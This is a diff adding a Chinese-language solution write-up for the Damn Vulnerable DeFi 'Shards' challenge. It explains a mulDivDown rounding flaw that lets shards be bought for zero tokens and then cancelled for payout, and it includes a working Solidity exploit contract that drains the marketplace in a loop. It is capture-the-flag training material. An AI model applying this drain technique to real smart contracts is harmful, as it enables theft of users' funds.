@@ -1094,3 +1094,72 @@ Memory loc      Data
 0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
 If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
 ```
+### Shards
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/shards/): Shards NFT 市場是一個無需許可的智能合約，允許 Damn Valuable NFT 的持有者以任何價格（以 USDC 表示）出售這些 NFT。這些 NFT 可能非常有價值，以至於賣家可以將它們拆分成較小的份額（稱為 “shards”）。買家可以購買這些 shards，這些份額以 ERC1155 代幣形式表示。只有當整個 NFT 售出後，市場才會向賣家付款。市場向賣家收取 1% 的手續費，並以 Damn Valuable Tokens (DVT) 支付。這些 DVT 可以存放在安全的鏈上金庫中，而該金庫與 DVT 的質押系統整合。有人正在出售一個 NFT，價格高達……哇，一百萬 USDC？在那些瘋狂的玩家發現之前，你最好先深入研究這個市場。你一開始沒有任何 DVT，請儘量在一次交易中救回資金，並將資產存入指定的回收帳戶。
+
+過關條件:
+- Staking 合約中的代幣餘額沒有改變
+- marketplace 中消失的代幣（missingTokens）大於 initialTokensInMarketplace 的 0.01%
+- 所有追回的資金必須被轉移到 recovery 錢包
+- 必須只執行了一次交易
+
+知識點:
+- mulDivDown 向下捨去後為 0
+
+解題:
+- 題目預設有1個正在賣的NFT. 但 player 並沒有 dvt token 那要怎麼玩下去?
+- 檢查fill()的時候, 發現 want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards) 購買者購買的碎片數量是 want，但是該函數中的計算公式可能存在浮點數下溢或計算錯誤的情況，特別是 mulDivDown 和 _toDVT 的結合使用. 但這裡的算法會導致當 want 的數值較小時，最終計算結果可能為 0。這應該就是這題的考點. 所以我們可以支付 0 DVT 代幣即可獲得大量的 NFT 碎片. 計算後want最大值可以是133都會是0元購買.
+- 透過0元買到的 NFT 碎片, 可以透過cancel() 把碎片還給Marketplace, 這時候就可以拿到DVT代幣了.
+- POC 我執行了10001次, 在local run沒有fail. 如果再private fork環境fail的話再修改算法就好了.
+
+```
+    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
+
+        paymentToken.transferFrom(
+            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
+        );
+        if (offer.stock == 0) _closeOffer(offerId);
+    }
+    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
+        return _value.mulDivDown(_rate, 1e6);
+    }
+
+```
+
+
+[POC](./damn-vulnerable-defi/test/shards/Shards.t.sol) :
+
+```
+ 
+    function test_shards() public checkSolvedByPlayer {
+
+        Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+        console.log("recovery balance",token.balanceOf(address(recovery)));
+        
+    }
+contract Exploit {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address recovery;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100; // Fill 100 shards per call
+
+        // Loop 10 times to execute fill(1, 100)
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+
+        token.transfer(recovery,token.balanceOf(address(this)));
+    }
+}
+```
